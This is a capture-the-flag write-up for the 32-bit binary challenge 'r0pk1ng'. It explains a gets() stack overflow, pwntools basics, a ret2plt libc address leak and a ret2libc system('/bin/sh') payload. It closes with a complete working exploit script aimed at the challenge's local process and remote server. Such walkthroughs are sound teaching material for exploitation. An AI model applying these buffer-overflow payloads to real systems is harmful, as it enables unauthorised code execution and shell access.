

# Writeup for the challenge r0pk1ng:-

## Description for the challenge:-

<b>prove your ROP skills by defeating the r0pk1ng</b>



### Challenge files provided for the challenge is only the vulnerable binary.



### Checksec:-

| Mitigation   | Stance             |
| ------------ | ------------------ |
| RELRO        | Partial RELRO      |
| Stack Canary | No Canary Found    |
| NX           | NX Enabled         |
| PIE          | No PIE(0x08048000) |

### This Writeup is gonna be a super long though is a simple 32 bit ret2libc and also via rop to make a syscall challenge..I wanna go in depth about it:-

![mandatory begin meme](https://c.tenor.com/x-FL-l7ERS4AAAAC/and-here-we-go-joker.gif)

####  This time let's mix some things here to get super basic with some program analysis,pwntools basics and then the exploit plan

1. Let's analyze the program in ghidra and note the functions present and its decompiled code.

![functions](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/first.png)

2. Most of the functions present here are compiler generated functions here..The user defined functions here are `main,init,vuln and gadgets`

3. Obviously from the name we can know that `init` function always sets up the buffering and alarm always.

   Let's see for our ourselves then...

   ```C
   int init(EVP_PKEY_CTX *ctx)
   
   {
     unsigned int uVar1;
     
     setvbuf(stdin,(char *)0x0,2,0);
     setvbuf(stdout,(char *)0x0,2,0);
     uVar1 = alarm(0x3c);
     return uVar1;
   }
   ```

    My face whenever I see a `init` function  or `initialise` function present in a binary.

   ![same thing](https://i.imgflip.com/623mbp.jpg)

   4. Let's see at any other important functions present which is obviously `main` function.

      ```c
      int main(void)
      
      {
        init((EVP_PKEY_CTX *)&stack0x00000004);
        puts("A wild r0pk1ng has appeared!");
        puts("Can you out ROP the r0pk1ng?");
        vuln();
        return 0;
      }
      ```

      Here we can see that `main` function calls `init` function and also the `vuln` function which possibly may be the function which holds a vulnerability because of its suspicious naming. 

      ```c
      void vuln(void)
      
      {
        char local_24 [28];
        
        gets(local_24);
        return;
      }
      ```

      Here you can see the use of `gets` function to ask user input which is notoriously known for its overflow vulerability.

      ### But the important part people mostly don't know in C is which ever function that doesn't use size parameter to accept user input is vulnerable to buffer overflow and also function that even uses it must provide sizeof(var_name) to provide the maximum size to read for the input variable..

      Let's see the bugs section for gets function in man pages.

      ```
      BUGS
             Never  use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.It has been used to break computer security.  Use fgets() instead.
      ```

      ![me](https://www.memecreator.org/static/images/memes/4420010.jpg)

      

      This is an example of how a 32 bit runtime stack of a running process in which `main` called a  another function called `func` might look like.

      For our program in your imagination replace it with name `func` with name `vuln`  and also replace the variables according to our program.

      ![stack](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/second.png))

      So here can we can see that if we overflow the buffer at `vuln` function aka `func` in the above image can tamper all the values below in stack till the end of stack and obviously saved ebp on vuln,return address of vuln ,arguments of vuln function, main function local variables and its saved ebp,return address and also arguments to main.

   5. Let's see what will happen before and after we overflow the buffer with A's .

      #### Normal working-
   
      ![stack](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/third.png)

#### 						After Overflow:-

​			![fourth](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/fourth.png)

0x41414141 is not a valid memory region so it obviously crashes but what happens if we point to a valid memory region. We will hijack the flow of 		  execution without crashing.

6. Let's do some programming stuff using pwntools library to just redirect back to the vuln function.

   ![memee](https://i.imgflip.com/6258wh.jpg)

   The first step let's import the pwntools library using the import statement.

   ```python
   from pwn import *
   ```

   Basically it tells the program to import all the functions(`*`) everything in pwntools library.

   To work easily let's pass the vulnerable program to ELF object. The reason we need to pass the file to the ELF object is to use symbol names like function name , .got sections of functions and also .plt sections of sections etc..,

   ```python
   e = ELF("file_name")
   ```

   

Let's find function address of main using the ELF object created using pwntools

```python
#!/usr/bin/env python3

from pwn import * 

e = ELF("./r0pk1ng")
print(hex(e.sym.main))
```



Let me show the output in python3 console

![fifth](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/fifth.png)

Here we can see that it prints out the address of the main function in the binary.. The reason why I gave `sym` is because `function names and global variables are symbols`

For function names we give `sym` ,for got section we give `got` ,for `plt` section we give `plt` ..Let's check that too.

![sixth](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/sixth.png)

 

We can also create a process for the binary and communicate with it.

```python
r = process("./r0pk1ng")
```

This line runs the file and allows use to communicate with the reference variable.. Like we can  send data using `send(data to send) sendline(data to send)  sendafter(The value that needs to be printed in stdout before sending the data in second argument,data to send) sendlineafter(The value that needs to be printed in stdout before sending the data in second argument,data to send)` Difference between functions you all can guess by the name.. Send sends the data as it is while sendline does the same but with a newline at the end. Sendafter and sendlineafter also has the same difference between them. 

![seventh](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/seventh.png)

Here you can see that ajay is in stack which we have sent using the send command as gets reads till it encounter a newline we then send the newline.

You can also use sendline if you don't want to send newline seperately.

And you can clearly see that `r = process("./r0pk1ng")` started a new process with process id 8697.

Pwntools not only helps you to only send data but also to receive data. Some of the functions are `recv() and recvline() and recvuntil(the limiter to read untill)` recv() receives  everything in the output when it called while recvline() receives until a newline is encountered recvuntil(limiter) it receives data until the limiter argument is encountered.

![eight](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/eight.png)

From the above console output we can see that after executing binary it prints all which has the same output like the r.recv() while r.recvline() receives until newline is encountered and r.recvafter(argument) receives until the argument value is encountered in stdout.

 And I know you guys are tired using "\xef\xbe\xad\xde" for using non-ASCII inputs .. And may use struct.pack too..But there is something easier than that in pwntools .Pwntools has its own functions for byte packing like `p8(value to pack in 8 bytes) p16(value to pack in 16 bytes) p32(value to pack in 32 bytes) p64(value to pack in 64 bytes)`

![ninth pic](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/ninth.png)



From above,we can see that how byte packing is super easing in pwntools..

Now as the basics of the prntools are covered ..Let's go and exploit this binary.



![know meme](https://i.imgflip.com/625enk.jpg)



7. After some analysis we found that number of A's to reach the return address is 36. So we give 36 A's and the address of vuln to return back to vuln again.

   ![tenth](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/tenth.png)

From the above image we can see that we tampered the return address and return back to the same function again.

![meme again](https://i.kym-cdn.com/photos/images/newsfeed/001/176/251/4d7.png)

8. From the console images,we can see that in GDB stack memory addresses are different ..It is because of ASLR which also randomises libc.

   #### So let's leak a libc address to find the libc base and then find out address of system function and "/bin/sh" string.How to leak libc tho...The answer is ret2plt as there is no PIE here ..The .got section has the libc address here is why after binding the functions to its libc address the program needs to keep the libc address stored somewhere to call easily as it had already bind .The address is kept at .got section  in binary whose location does not change because of the absence of PIE.. So we have a location that contain libc address ..How to use the address present in got tho..The answer is any output function that prints outputs to stdout like puts,printf,fprintf,read ,etc.., 

   In 32 bit arguments for the functions are present in stack where the return address is also present.. 

   ![11](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/11th.png)

From the above image, you can see that during the start of a function the top of the stack is the return address and then the next value is the function argument. So in our exploit that leaks address the order is the 36 A's then puts plt which calls puts the place where we need to go first then the return address of puts (the place to go after puts finishes executing) and then finally the argument for the puts function.

![12](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/12th.png)

From the above console,we can see that there are some unprintable characters getting printed after the normal puts statements present in program.

Our exploit was able to leak libc address from puts got using ret2plt attack and then we return back to vuln..

Now as we have leaked the values we can now parse the address to get the libc address of puts to calculate libc base and then finally libc address of system and /bin/sh string in libc.

Let's use a trick first remove the strings using `recvuntil(b"Can you out ROP the r0pk1ng?")`  and then use `leak = r.recvuntil(b'\xf7").strip()`to take the libc value perfectly as 32 bit libc addresses most of the time starts at `\xf7` `\x7f` for 64 bit and strip function to remove the newline present at the start and also at the end. 

![13th](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/13th.png)

Here you can see that we have seperated the values from the surrounding libc values and puts statements from binary..

To convert the address to number we can use `decode('latin-1')` and then use byte unpacking function that does opposite to packing function.

convert byte object back to number .. And then some ljust too to unpack in 32 bit..

```python
leak = u32(r.recvuntil(b"\xf7").strip().decode('latin-1').ljust(4,'\x00'))
```

For 64,change `u32 to u64 `,`ljust(4,'\x00') to ljust(8,'\x00')` and finally `'\xf7' to '\x7f'`.

```python
leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
```

But as this binary is 32 bit..Let's use the 32 bit version of code to parse the leak...

Then use the ELF object to parse the LIBC file for 32 bit ..

```python
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
```

To calculate the libc base,

```python
libc_base = leak - libc.sym.puts
```



Now the rest of the exploit goes like this 

```python
print(hex(libc_base))
exploit = b"A" * 36 + p32(libc_base + libc.sym.system) + p32(0) + p32(libc_base + next(libc.search(b"/bin/sh\x00"))) + b"\n"
r.send(exploit)
r.interactive()
```



The first line above prints the libc base calculated from above and then use the libc base and then add up with the system offset in libc ELF object and then find the location of /bin/sh string in libc ELF object by using libc.search and we are giving the /bin/sh string to search inside libc. 

And finally sending the exploit using send method.

Then what is the r.interactive() this is the function that we are going to use it to interact with the program which is basically our shell.

My exploit script i wrote for the challenge is slightly different:-

```python
#!/usr/bin/env python3



from pwn import *

e = ELF("./r0pk1ng")
r = process("./r0pk1ng")
#r = remote("gc1.eng.run",30386)
#libc = ELF("./libc6-i386_2.31-0ubuntu9.2_amd64.so")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
exploit  = b"A" * 36 + p32(e.plt.puts) + p32(e.sym.main) + p32(e.got.gets) 
r.sendline(exploit)
r.recvuntil(b"Can you out ROP the r0pk1ng?")
leak = u32(r.recvuntil(b"\xf7").strip().decode('latin-1').ljust(4,'\x00'))
libc_base = leak - libc.sym.gets
print(hex(libc_base))
exploit = b"A" * 36 + p32(libc_base + libc.sym.system) + p32(0) + p32(libc_base + next(libc.search(b"/bin/sh\x00")))
r.sendline(exploit)
r.interactive()

```

![14th](https://raw.githubusercontent.com/vital-information-resource-under-siege/PWN-Challenges/main/inctf-pro-finals/r0pking/Writeup%20Images/14th.png)
